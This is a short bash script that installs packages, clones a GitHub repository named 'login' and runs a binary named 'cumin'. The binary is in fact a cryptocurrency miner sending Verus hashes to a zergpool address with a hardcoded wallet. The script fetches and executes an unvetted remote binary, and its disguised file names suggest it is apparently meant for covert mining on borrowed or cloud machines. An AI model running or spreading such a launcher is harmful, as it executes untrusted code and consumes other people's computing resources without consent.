#!/bin/bash
WORKER=$(echo $(shuf -i 10-40 -n 1)-kuli)
sudo apt update
sudo apt install screen libjansson4 xdotool -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
./cumin -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.$WORKER -t 70 -p c=VRSC,mc=VRSC
